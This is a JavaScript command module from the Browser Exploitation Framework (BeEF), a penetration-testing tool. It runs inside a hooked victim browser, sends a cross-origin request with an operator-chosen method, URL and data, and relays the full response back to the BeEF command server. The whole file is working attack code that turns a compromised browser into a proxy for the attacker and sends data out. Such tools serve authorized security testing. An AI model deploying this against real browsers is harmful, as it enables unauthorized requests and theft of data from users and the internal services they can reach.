//
// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var method = "<%= @method %>";
	var url    = "<%= @url %>";
	var data   = "<%= @data %>";
	var timeout = 15000;

	beef.net.cors.request(method, url, data, timeout, function(response) { beef.net.send("<%= @command_url %>", <%= @command_id %>, "response="+JSON.stringify(response)); });

});

